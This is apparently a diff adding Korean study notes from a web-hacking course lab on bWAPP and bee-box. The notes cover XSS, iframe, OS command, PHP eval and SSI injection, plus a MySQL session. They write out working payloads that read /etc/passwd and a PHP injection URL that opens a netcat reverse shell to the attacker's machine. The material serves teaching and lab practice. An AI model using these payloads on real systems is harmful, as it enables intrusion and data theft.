@@ -1,0 +1,195 @@
+
+
+1 ) reflected = web 서버가 준게아닌 사용자가 클릭햇을때 잇던 스크립트를 보여주는것.
+  - 공격자가 태그/스크립트를 삽입한 url을 클라이언트가 실행할 경우, 서버로 http요청을 보내고
+    응답을 받을때 태그/스크립트가 클라이언트에서 실행되는 방식
+
+2 ) Stored    = web 서버에 스크립트를 넣어놓고 사용자의 어떤 의도대로 하게끔 해주는것.
+  - 공격자가 웹서버 게시판에 태그/스크립트를 삽입하여, 클라이언트가 해당 게시판을 접근할 경우, 태그/스크립트가
+   실행되는 방식
+  - 게시판을 접근시 발생 하는 현상 : 피싱 사이트 접근, 쿠키 정보 및 개인 정보 유출, 불필요한 및 악의적인 프로그램 설치
+
+
+  5. HTML Injection - iFrame Injection
+
+  1) iframe
+
+  - HTML 내용 안에서 다른 HTML 내용을 출력할 수 있는 HTML 태그
+  - 형식 : <iframe src="출력 페이지 주소" width="가로 사이즈" height="세로 사이즈"></iframe>
+
+ 55   <iframe frameborder="0" src="robots.txt" height="250" width="250"></iframe>
+
+
+  2) 'robots.txt' 파일
+
+  - 검색 엔진을 통해서 정보를 검색하는 것을 허용/거부할 때 사용하는 파일
+  - 만약, 민감한 파일 및 디렉토리가 검색된다면, 정보가 노출되는 문제가 발생할 수 있다.
+  - 'robots.txt' 파일은 웹-서버 홈 디렉토리에 있어야 한다.
+
+형식		            	내용
+
+User-agent: *		모든 검색 엔진
+User-agent:     googlebot	googlebot 검색 엔진
+Allow:          /모든 디렉토리 접근 허용
+Disallow:       test.ini		'test.ini' 파일 검색 차단
+Disallow:       /admin/		'admin' 디렉토리 검색 차단
+Disallow:       /		다 차단(크롤링 차단)
+Disallow: 			더 허용(크롤링 허용)
+
+
+  - http://192.168.20.205/bWAPP/robots.txt
+
+ User-agent: GoodBot
+ Disallow:
+
+ User-agent: BadBot
+ Disallow: /
+
+ User-agent: *
+ Disallow: /admin/
+ Disallow: /documents/
+ Disallow: /images/
+ Disallow: /passwords/
+
+
+
+
+http://192.168.20.205/bWAPP/robots.txt
+
+
+
+bee@bee-box:~$ date
+Wed Oct 16 13:25:54 CEST 2019
+bee@bee-box:~$ cal ; date
+    October 2019
+Su Mo Tu We Th Fr Sa
+       1  2  3  4  5
+ 6  7  8  9 10 11 12
+13 14 15 16 17 18 19
+20 21 22 23 24 25 26
+27 28 29 30 31
+
+Wed Oct 16 13:25:59 CEST 2019
+
+bee@bee-box:~$ cat /etc/passwrd | head -3
+cat: /etc/passwrd: No such file or directory
+bee@bee-box:~$ cat /etc/passwd | head -3
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+bee@bee-box:~$
+
+
+
+5. OS Command Injection
+
+ - 웹-서버로 명령어를 삽입하여 불필요한 동작을 실시하거나 정보를 출력하는 인젝션 기법
+ - 메타케릭터 중에 '|', ';' 을 이용한다.
+
+bee@bee-box:~$ cat /etc/passwd | head -3
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+
+bee@bee-box:~$ nslookup www.google.com ; cat /etc/passwd | head -3
+Server:		168.126.63.1
+Address:	168.126.63.1#53
+
+Non-authoritative answer:
+Name:	www.google.com
+Address: 172.217.26.36
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+
+
+www.google.com ; cat /etc/passwd | head -3
+
+Server: 168.126.63.1 Address: 168.126.63.1#53 Non-authoritative answer: Name: www.google.com Address: 172.217.25.196 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh
+
+
+6. PHP Code Injection
+
+ 1) eval 함수 취약점
+
+ - eval 함수는 문자열을 입력 받으면 문자열로 처리하지 않고 수식으로 처리하여 결과 값을 반환하는 함수
+ - 그렇기 때문에 문자를 변수로 인식하여 특정 정보를 출력하는 취약점을 갖고 있다.
+ - 즉 eval() 에서 () 안에 들어간 문자를 문자로 처리하지 않고 변수로 처리함
+
+service apache2 status
+
+http://192.168.20.50/evaltest.php
+
+
+root@kali:/var/www/html# vi evaltest.php
+
+<?php
+
+echo "abcd". '<br>';
+eval("echo \"efgh\"; system('cat /etc/passwd | head -3');"). '<br>';
+?>
+
+http://192.168.20.205/bWAPP/phpi.php?message=test; system('nc 192.168.20.50 4444 -e /bin/bash')
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+7. Server-Side Includes (SSI) Injection
+ 1) ssl
+  - html 전체 코드를 수정하지 않고 공통 모듈 파일 개염으로 관리하여 동적 내용을 추가하는 기능을 수행함
+  - ssl을 사용하는 웹 페이지는 '.shtml'파일을 사용함
+  - ex ) 방문자수 누적, 홈페이지 로그 수정...,
+
+<!--#exec cmd="cat /etc/passwd"-->
+
+
+[참고] addslashes
+
+ - 특수 문자(', ") 앞에 역슬래시(\)를 삽입하여 특수문자 기능을 문자로 처리하는 함수
+
+ mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| bWAPP              |
+| cisco              |
+| drupageddon        |
+| mysql              |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql> use cisco;
+Database changed
+mysql> ls
+    -> ;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ls' at line 1
+mysql> show tables;
+Empty set (0.00 sec)
+
+mysql> create table ccna (userid varchar(20),userpass varchar(20),username varchar(20),age int);
+Query OK, 0 rows affected (0.01 sec)
+
+mysql> create table ccnp (userid varchar(20),userpass varchar(20),username varchar(20),age int);
+Query OK, 0 rows affected (0.00 sec)
+
+mysql> show tables;
++-----------------+
+| Tables_in_cisco |
++-----------------+
+| ccna            |
+| ccnp            |
++-----------------+
+2 rows in set (0.00 sec)
+
+mysql> desc ccna;
++----------+-------------+------+-----+---------+-------+
+| Field    | Type        | Null | Key | Default | Extra |
++----------+-------------+------+-----+---------+-------+
+| userid   | varchar(20) | YES  |     | NULL    |       |
+| userpass | varchar(20) | YES  |     | NULL    |       |
+| username | varchar(20) | YES  |     | NULL    |       |
+| age      | int(11)     | YES  |     | NULL    |       |
++----------+-------------+------+-----+---------+-------+
+4 rows in set (0.01 sec)
+
+mysql>
